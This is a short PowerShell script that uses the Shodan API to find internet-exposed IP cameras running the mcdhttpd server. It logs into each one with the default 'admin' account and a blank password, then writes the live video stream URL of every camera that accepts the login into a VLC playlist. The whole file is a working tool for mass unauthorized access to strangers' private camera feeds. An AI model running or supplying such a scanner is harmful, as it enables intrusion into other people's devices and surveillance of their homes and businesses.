param (
    [Parameter(Mandatory=$True)]
    [string]
    $sodanKey,
    
    [Parameter(Mandatory=$True)]
    [string]
    $playlistFile
)

# API Key from https://account.shodan.io/

$ErrorActionPreference = "SilentlyContinue"
$cred = New-Object System.Management.Automation.PSCredential("admin", (new-object System.Security.SecureString))

$data = Invoke-RestMethod -Method GET -Uri ("https://api.shodan.io/shodan/host/search?key="+$sodanKey+"&query=mcdhttpd")

Add-Content $playlistFile "#EXTM3U`n"
Add-Content $playlistFile "#EXTVLCOPT:network-caching=1000`n"


foreach ($match in $data.matches) {
    $ip = $match.ip_str

    $code = (Invoke-WebRequest ("http://"+$ip+"/check_user.cgi") -Credential $cred -ErrorAction SilentlyContinue).StatusCode

    if ($code -eq 200) {
        Add-Content $playlistFile ("http://admin:@"+$ip+"/videostream.asf`n")
        Write-Verbose $ip
    }
}